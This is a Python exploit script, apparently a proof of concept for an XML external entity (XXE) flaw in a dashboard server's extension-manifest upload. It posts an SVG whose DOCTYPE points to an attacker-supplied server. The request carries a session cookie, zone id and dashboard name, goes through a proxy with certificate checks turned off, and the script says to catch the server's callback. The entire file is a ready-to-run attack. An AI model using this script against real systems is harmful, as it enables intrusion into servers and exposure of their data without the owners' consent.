import requests
import sys
from warnings import filterwarnings

# Globals
proxy = 'http://127.0.0.1:8080'
proxies = {'http': proxy, 'https': proxy}
filterwarnings('ignore')


def xxe(target, attackerserver, boundary, cookie, zoneid, dashboard):
    payload = """<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE root PUBLIC "-//A/B/EN" """
    payload += "\"" + attackerserver + "\"><svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"><text x=\"0\" y=\"20\" font-size=\"20\">test</text></svg>"
    headers = {'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Cookie': 'workgroup_session_id=' + cookie}
    data = "--" + boundary + "\r\n"
    data += """Content-Disposition: form-data; name=\"zoneId\"""" + "\r\n"
    data += "\r\n"
    # below will be different for each user - this is the zoneid of the dashboard you're exploiting this against
    data += zoneid + "\r\n"
    data += "--" + boundary + "\r\n"
    data += """Content-Disposition: form-data; name=\"dashboard\"""" + "\r\n"
    data += "\r\n"
    # below will be different for each user - the name of the dashboard we have access to which we're exploiting this against
    data += dashboard + "\r\n"
    data += "--" + boundary + "\r\n"
    data += """Content-Disposition: form-data; name=\"wasCanceled\"""" + "\r\n"
    data += "\r\n"
    data += "false"
    data += "\r\n"
    data += "--" + boundary + "\r\n"
    data += """Content-Disposition: form-data; name=\"extensionManifestContents\"""" + "\r\n"
    data += "\r\n"
    data += payload
    data += "\r\n"
    data += "--" + boundary + "--"

    r = requests.post(target, headers=headers, data=data, proxies=proxies, verify=False)


def main():
    if len(sys.argv) != 7:
        print
        "(+) usage: %s <target><attackerserver><boundary><workgroup_session_id_cookie><zoneid><dashboardname>" % \
        sys.argv[0]
        sys.exit(-1)
    target = sys.argv[1]
    attackerserver = sys.argv[2]
    boundary = sys.argv[3]
    cookie = sys.argv[4]
    zoneid = sys.argv[5]
    dashboard = sys.argv[6]
    xxe(target, attackerserver, boundary, cookie, zoneid, dashboard)
    print
    "making request, make sure to catch the HTTP request!"


if __name__ == "__main__":
    main()